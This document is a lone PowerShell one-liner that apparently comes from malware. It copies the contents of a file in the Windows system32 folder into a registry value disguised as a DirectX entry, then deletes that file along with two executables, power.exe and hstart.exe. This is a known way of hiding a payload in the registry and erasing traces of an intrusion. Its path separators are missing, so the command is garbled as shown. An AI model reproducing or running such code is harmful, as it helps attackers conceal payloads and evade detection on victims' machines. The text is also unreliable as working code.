$b=Get-Content $env:windirsystem321.txt;Set-ItemProperty -Path "HKLM:SOFTWAREClassesDIRECT.DirectX5.0scripts" -Name "1" -Value $b;Remove-Item $env:windirsystem321.txt;Remove-Item $env:windirsystem32power.exe;Remove-Item $env:windirsystem32hstart.exe